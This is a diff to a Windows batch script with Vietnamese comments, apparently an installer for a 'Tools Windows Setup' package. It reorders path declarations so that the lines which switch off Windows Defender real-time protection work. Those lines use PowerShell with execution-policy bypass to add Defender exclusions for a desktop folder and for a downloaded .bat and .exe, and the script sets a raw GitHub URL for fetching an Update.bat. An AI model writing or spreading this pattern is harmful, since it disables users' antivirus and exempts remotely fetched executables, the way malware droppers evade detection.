@@ -40,6 +40,17 @@ echo Dang chay voi quyen Admin.
 echo.
 
 :: ========================
+:: KHAI BÁO ĐƯỜNG DẪN / URL
+:: ========================
+set "DESKTOP=%USERPROFILE%\Desktop"
+set "TARGETDIR=%DESKTOP%\Tools Windows Setup"
+set "FILE2=%TARGETDIR%\Tools_Windows_Setup.zip"
+set "FILE3=%TARGETDIR%\Tools_Windows_Setup.exe"
+set "FILE1=%TARGETDIR%\Update.bat"
+set "EXE_7z_x64=%TEMP%\7z2301-x64.exe"
+set "EXE_7z_x32=%TEMP%\7z2301.exe"
+
+:: ========================
 :: TẮT TẠM THỜI DEFENDER (Win10+; Win7/8 try/catch)
 :: ========================
 echo Dang tat tam thoi Windows Defender Real-Time Protection...
@@ -51,25 +62,11 @@ powershell -NoP -Ep Bypass -C ^
  "Try { Add-MpPreference -ExclusionPath '%TARGETDIR%'; Add-MpPreference -ExclusionProcess '%FILE3%'; exit 0 } Catch { Write-Host $_.Exception.Message; exit 1 }"
 set RC=%ERRORLEVEL%
 powershell -NoP -Ep Bypass -C ^
- "Try { Add-MpPreference -ExclusionPath '%TARGETBAT%'; Add-MpPreference -ExclusionProcess '%FILE1%'; exit 0 } Catch { Write-Host $_.Exception.Message; exit 1 }"
+ "Try { Add-MpPreference -ExclusionPath '%TARGETDIR%'; Add-MpPreference -ExclusionProcess '%FILE1%'; exit 0 } Catch { Write-Host $_.Exception.Message; exit 1 }"
 set RC=%ERRORLEVEL%
 
 echo Da gui lenh tat tam thoi (neu that bai, van tiep tuc).
 echo.
-
-:: ========================
-:: KHAI BÁO ĐƯỜNG DẪN / URL
-:: ========================
-set "DESKTOP=%USERPROFILE%\Desktop"
-set "TARGETDIR=%DESKTOP%\Tools Windows Setup"
-set "TARGETBAT=%TEMP%\Update"
-set "FILE1=%TEMP%\Update\Update.bat"
-set "FILE2=%TARGETDIR%\Tools_Windows_Setup.zip"
-set "FILE3=%TARGETDIR%\Tools_Windows_Setup.exe"
-set "EXE_7z_x64=%TEMP%\7z2301-x64.exe"
-set "EXE_7z_x32=%TEMP%\7z2301.exe"
-
-
 
 
 set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Update.bat"
